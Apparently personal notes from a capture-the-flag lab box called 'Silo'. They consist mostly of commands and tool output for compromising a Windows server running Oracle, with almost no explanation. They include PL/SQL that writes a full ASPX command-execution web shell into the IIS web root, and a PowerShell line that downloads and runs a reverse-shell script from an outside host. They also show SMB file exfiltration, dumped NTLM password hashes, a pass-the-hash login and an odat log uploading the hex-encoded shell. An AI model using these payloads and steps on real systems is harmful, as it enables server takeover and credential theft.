# Silo

# keyword

**oracle, sed, tr**

# information

# sed

```bash
sed -z  's/\n//g'  cmd.aspx
tr -d '\n' < cmd.aspx
tr '\n' ''
```



# oracle in  write file

```sql
declare
s varchar2(1024);
f utl_file.file_type;
begin
	s := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg"  runat="server" Width="250px"></asp:TextBox><asp:Button id="testing"  runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText"  runat="server">Command:</asp:Label></form></body></HTML>';
	f := utl_file.fopen('c:\inetpub\wwwroot\', 'hello.aspx', 'W');
	utl_file.put_line(f,s);
	utl_file.fclose(f);
end;
```

#  revershell

powershell  iex(new-object net.webclient).downloadString('http://10.10.14.27/rv.ps1')

```

```



#  transfer use smb

```powershell
impacket-smbserver share `pwd`
PS C:\users\phineas\desktop> z:
PS Z:\> cp C:\users\phineas\desktop\"Oracle issue.txt" .

```

# encoding in the windows

```powershell
$fc = get-content "Oracle issue.txt"
PS C:\users\phineas\desktop> $fe = [System.Text.Encoding]::UTF8.getBytes($fc)
PS C:\users\phineas\desktop> [System.Convert]::ToBase64String($fe)
```

# volatility

```bash
volatility -f SILO-20180105-221806.dmp  --profile=Win2012R2x64 hashdump
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::

pth-winexe -U administrator%'aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7' //
//10.10.10.82
```

# Payload upload in odat

```
/opt/odat/odat.py utlfile -vvv  -s 10.10.10.82 -U scott -P tiger --sysdba   -d XE --putFile 'c:\inetpu
b\wwwroot' bbb.aspx oracle/cmdasp.aspx
```



```bash
12:53:54 INFO -: SQL request executed: CREATE OR REPLACE DIRECTORY ODATPREFIXHEWHIFAEWVVUWKRXFKBY AS 'c:\inetpub\wwwroot'
12:53:54 INFO -: SQL request executed: GRANT READ,WRITE ON DIRECTORY ODATPREFIXHEWHIFAEWVVUWKRXFKBY TO PUBLIC
12:53:55 DEBUG -: Loading the oracle/cmdasp.aspx file
12:53:55 DEBUG -: Create the bbb.aspx file remotly
12:53:55 INFO -: SQL request executed: DECLARE fi UTL_FILE.FILE_TYPE; bu RAW(32766); BEGIN fi:=UTL_FILE.fopen('ODATPREFIXHEWHIFAEWVVUWKRXFKBY','bbb.aspx','wb',32766); UTL_FILE.fclose(fi); END;
12:53:55 INFO -: SQL request executed: DECLARE fi UTL_FILE.FILE_TYPE; bu RAW(32766); BEGIN bu:=hextoraw('3c25402050616765204c616e67756167653d224323222044656275673d2274727565222054726163653d2266616c73652220253e0a3c254020496d706f7274204e616d6573706163653d2253797374656d2e446961676e6f73746963732220253e0a3c254020496d706f7274204e616d6573706163653d2253797374656d2e494f2220253e0a3c736372697074204c616e67756167653d226323222072756e61743d22736572766572223e0a766f696420506167655f4c6f6164286f626a6563742073656e6465722c204576656e74417267732065290a7b0a7d0a737472696e6720457863757465436d6428737472696e6720617267290a7b0a50726f636573735374617274496e666f20707369203d206e65772050726f636573735374617274496e666f28293b0a7073692e46696c654e616d65203d2022636d642e657865223b0a7073692e417267756d656e7473203d20222f6320222b6172673b0a7073692e52656469726563745374616e646172644f7574707574203d20747275653b0a7073692e5573655368656c6c45786563757465203d2066616c73653b0a50726f636573732070203d2050726f636573732e537461727428707369293b0a53747265616d5265616465722073746d726472203d20702e5374616e646172644f75747075743b0a737472696e672073203d2073746d7264722e52656164546f456e6428293b0a73746d7264722e436c6f736528293b0a72657475726e20733b0a7d0a766f696420636d644578655f436c69636b286f626a6563742073656e6465722c2053797374656d2e4576656e74417267732065290a7b0a526573706f6e73652e577269746528223c7072653e22293b0a526573706f6e73652e5772697465285365727665722e48746d6c456e636f646528457863757465436d64287478744172672e546578742929293b0a526573706f6e73652e577269746528223c2f7072653e22293b0a7d0a3c2f7363726970743e0a3c48544d4c3e0a3c626f6479203e0a3c666f726d2069643d22636d6422206d6574686f643d22706f7374222072756e61743d22736572766572223e0a3c6173703a54657874426f782069643d2274787441726722202072756e61743d22736572766572222057696474683d223235307078223e3c2f6173703a54657874426f783e0a3c6173703a427574746f6e2069643d2274657374696e6722202072756e61743d227365727665722220546578743d2265786375746522204f6e436c69636b3d22636d644578655f436c69636b223e3c2f6173703a427574746f6e3e0a3c6173703a4c6162656c2069643d226c626c5465787422202072756e61743d22736572766572223e436f6d6d616e643a3c2f6173703a4c6162656c3e0a3c2f666f726d3e0a3c2f626f64793e0a3c2f48544d4c3e0a0a'); fi:=UTL_FILE.fopen('ODATPREFIXHEWHIFAEWVVUWKRXFKBY','bbb.aspx','ab',32766); UTL_FILE.put_raw(fi,bu,TRUE); UTL_FILE.fclose(fi); END;
12:53:55 DEBUG -: Drop the ODATPREFIXHEWHIFAEWVVUWKRXFKBY directory
12:53:55 INFO -: SQL request executed: DROP DIRECTORY ODATPREFIXHEWHIFAEWVVUWKRXFKBY
```

 0x080483f4, 0x08048434 